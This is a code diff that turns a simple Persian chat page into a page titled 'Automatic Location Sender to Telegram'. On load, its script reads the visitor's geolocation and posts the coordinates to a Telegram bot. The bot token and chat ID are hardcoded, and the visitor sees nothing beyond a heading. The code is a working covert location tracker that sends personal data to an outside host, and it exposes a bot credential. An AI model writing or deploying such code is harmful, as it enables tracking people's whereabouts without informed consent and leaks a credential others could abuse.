@@ -1,90 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <style>
-        body, html {
-    margin: 0;
-    padding: 0;
-    font-family: Arial, sans-serif;
-    height: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background-color: #f4f4f4;
-}
+    <title>Automatic Location Sender to Telegram</title>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    sendLocationToTelegram(latitude, longitude);
+                }, error => {
+                    console.error('Error getting location:', error);
+                });
+            } else {
+                console.log('Geolocation is not supported by this browser.');
+            }
+        };
 
-#chat-container {
-    width: 90%;
-    max-width: 600px;
-    margin: auto;
-    background: white;
-    box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    padding: 20px;
-    display: flex;
-    flex-direction: column;
-}
+        function sendLocationToTelegram(latitude, longitude) {
+            const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendLocation';
+            const params = new URLSearchParams();
+            params.append('chat_id', '1209515299');
+            params.append('latitude', latitude);
+            params.append('longitude', longitude);
 
-#messages {
-    flex-grow: 1;
-    overflow-y: auto;
-    padding: 10px;
-    border: 1px solid #ccc;
-    margin-bottom: 10px;
-    height: 300px;
-}
-
-input[type="text"] {
-    padding: 10px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    margin-right: 10px;
-    flex-grow: 1;
-}
-
-button {
-    padding: 10px 20px;
-    border: none;
-    background-color: #007BFF;
-    color: white;
-    cursor: pointer;
-}
-
-button:hover {
-    background-color: #0056b3;
-}
-    </style>
+            fetch(url, {
+                method: 'POST',
+                body: params
+            })
+            .then(response => response.json())
+            .then(data => console.log('Location sent to Telegram:', data))
+            .catch(error => console.error('Error sending location to Telegram:', error));
+        }
+    </script>
 </head>
 <body>
-    <div id="chat-container">
-        <div id="messages"></div>
-        <input type="text" id="message-input" placeholder="پیام خود را وارد کنید...">
-        <button onclick="sendMessage()">ارسال</button>
-    </div>
-    <script>
-        let messagesContainer = document.getElementById('messages');
-
-function sendMessage() {
-    let messageInput = document.getElementById('message-input');
-    let message = messageInput.value.trim();
-    if (message) {
-        displayMessage(message, 'You');
-        messageInput.value = '';
-        // Simulate receiving a reply
-        setTimeout(() => {
-            displayMessage("پیام دریافت شد", "Them");
-        }, 1000);
-    }
-}
-
-function displayMessage(message, sender) {
-    let messageElement = document.createElement('div');
-    messageElement.textContent = `${sender}: ${message}`;
-    messagesContainer.appendChild(messageElement);
-    messagesContainer.scrollTop = messagesContainer.scrollHeight;
-}
-    </script>
+    <h1>Automatic Location Sender</h1>
 </body>
 </html>
